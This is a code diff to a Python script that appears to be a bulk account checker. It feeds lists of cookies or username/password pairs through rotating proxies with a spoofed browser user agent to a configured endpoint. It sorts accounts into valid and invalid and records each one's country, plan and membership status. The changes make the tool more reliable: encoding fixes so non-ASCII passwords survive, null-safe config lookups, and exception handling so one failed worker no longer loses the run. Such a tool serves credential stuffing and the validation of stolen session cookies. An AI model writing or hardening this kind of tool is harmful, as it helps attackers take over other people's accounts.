@@ -62,7 +62,7 @@ DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
 def load_config():
     if not os.path.exists(CONFIG_FILE):
         return {}
-    with open(CONFIG_FILE) as f:
+    with open(CONFIG_FILE, encoding="utf-8") as f:
         return json.load(f)
 
 
@@ -199,12 +199,14 @@ def check_one(raw, idx, cfg, login_mode):
                 return None
         return v
 
-    region = dig(cfg.get("region_path", "model.summary.userCountry"))
-    region = region or dig(cfg.get("region_path_alt", "")) or "UNKNOWN"
-    plan = dig(cfg.get("plan_path", "model.summary.subPlan"))
-    plan = plan or dig(cfg.get("plan_path_alt", "")) or "UNKNOWN"
-    status = dig(cfg.get("status_path", "model.summary.membershipStatus"))
-    status = status or dig(cfg.get("status_path_alt", "")) or "OK"
+    # "or \"\"": a key present with a null value yields None, and None.split()
+    # raises AttributeError inside the worker -- which used to kill the run.
+    region = dig(cfg.get("region_path", "model.summary.userCountry") or "")
+    region = region or dig(cfg.get("region_path_alt", "") or "") or "UNKNOWN"
+    plan = dig(cfg.get("plan_path", "model.summary.subPlan") or "")
+    plan = plan or dig(cfg.get("plan_path_alt", "") or "") or "UNKNOWN"
+    status = dig(cfg.get("status_path", "model.summary.membershipStatus") or "")
+    status = status or dig(cfg.get("status_path_alt", "") or "") or "OK"
 
     return (idx, {
         "valid": True,
@@ -233,6 +235,8 @@ def main():
     for f in (args.cookies, args.creds, args.proxies):
         if f and not os.path.isfile(f):
             sys.exit(f"[!] file nahi mila: {f}")
+    if args.threads < 1:                 # ThreadPoolExecutor raises on 0
+        args.threads = 1
 
     ts = now_stamp()
     run_id = random.randint(10 ** 14, 10 ** 18 - 1)
@@ -246,17 +250,28 @@ def main():
             cfg["_proxy_list"] = [l for l in f if l.strip()]
 
     login_mode = bool(args.creds)
-    src_lines = []
-    if args.cookies:
-        with open(args.cookies, encoding="utf-8", errors="ignore") as f:
-            src_lines += [l.rstrip("\r\n") for l in f if l.strip()]
-    if args.creds:
-        with open(args.creds, encoding="utf-8", errors="ignore") as f:
-            src_lines += [l.rstrip("\r\n") for l in f if l.strip()]
+    # errors="replace", not "ignore": "ignore" silently deleted non-UTF-8 bytes,
+    # so a non-ASCII password was altered before it was ever sent. Count the
+    # damaged lines so the run is not quietly wrong.
+    src_lines, mangled = [], 0
+    for _p in (args.cookies, args.creds):
+        if not _p:
+            continue
+        with open(_p, encoding="utf-8", errors="replace") as f:
+            for _l in f:
+                _l = _l.rstrip("\r\n")
+                if not _l.strip():
+                    continue
+                if "\ufffd" in _l:
+                    mangled += 1
+                src_lines.append(_l)
 
     if not cfg.get("endpoint"):
         sys.exit("[!] config.json me 'endpoint' nahi hai — check karo, phir chalana.")
 
+    if mangled:
+        print(f"[!] {mangled} line(s) had undecodable bytes and were mangled "
+              f"(U+FFFD) before being checked")
     print(f"[*] {len(src_lines)} lines | threads {args.threads} | fresh run_id {run_id}")
     print(f"[*] endpoint: {cfg.get('endpoint')}")
     if login_mode:
@@ -267,10 +282,19 @@ def main():
     results = [None] * len(src_lines)
     done = 0
     with ThreadPoolExecutor(max_workers=args.threads) as ex:
-        futs = [ex.submit(check_one, line, i, cfg, login_mode)
-                for i, line in enumerate(src_lines)]
+        futs = {ex.submit(check_one, line, i, cfg, login_mode): i
+                for i, line in enumerate(src_lines)}
         for fut in as_completed(futs):
-            idx, res = fut.result()
+            idx = futs[fut]
+            try:
+                idx, res = fut.result()
+            except Exception as e:
+                # One worker raising (e.g. a non-numeric "timeout" in config.json)
+                # used to propagate out of fut.result() and lose EVERY result of
+                # the run. Record an error for this index and carry on.
+                res = {"valid": False, "retryable": True,
+                       "reason": f"exc:{type(e).__name__}: {str(e)[:120]}",
+                       "line": src_lines[idx]}
             results[idx] = res
             done += 1
             if not args.quiet and done % 100 == 0:
@@ -304,9 +328,12 @@ def main():
     ep = os.path.join(args.out, f"errors_{ts}_{run_id}.txt")
     rp = os.path.join(args.out, f"report_{ts}_{run_id}.json")
 
-    with open(vp, "w", newline="\n") as f: f.write("\n".join(valid) + ("\n" if valid else ""))
-    with open(ip, "w", newline="\n") as f: f.write("\n".join(invalid) + ("\n" if invalid else ""))
-    with open(ep, "w", newline="\n") as f: f.write("\n".join(errors) + ("\n" if errors else ""))
+    # encoding="utf-8": a non-ASCII credential, or a region/plan the API
+    # returned, raised UnicodeEncodeError here -- after two of the three files
+    # had already been written.
+    with open(vp, "w", newline="\n", encoding="utf-8") as f: f.write("\n".join(valid) + ("\n" if valid else ""))
+    with open(ip, "w", newline="\n", encoding="utf-8") as f: f.write("\n".join(invalid) + ("\n" if invalid else ""))
+    with open(ep, "w", newline="\n", encoding="utf-8") as f: f.write("\n".join(errors) + ("\n" if errors else ""))
 
     report = {
         "run_id": run_id,
